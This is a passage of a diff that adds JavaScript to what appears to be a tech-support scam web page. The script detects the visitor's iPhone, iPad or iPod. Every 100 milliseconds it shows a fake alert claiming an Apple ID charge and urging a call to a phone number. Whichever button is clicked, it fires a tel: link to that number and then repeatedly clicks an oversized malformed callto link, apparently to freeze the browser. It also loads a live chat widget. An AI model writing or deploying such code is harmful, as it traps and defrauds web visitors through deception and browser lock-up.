+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1-833-356-7271');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-833-356-7271"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $249.95 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support +1-833-356-7271 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
+    </script>
+
+
+
+
+
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/667056f19a809f19fb3eaed8/1i0jd783t';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
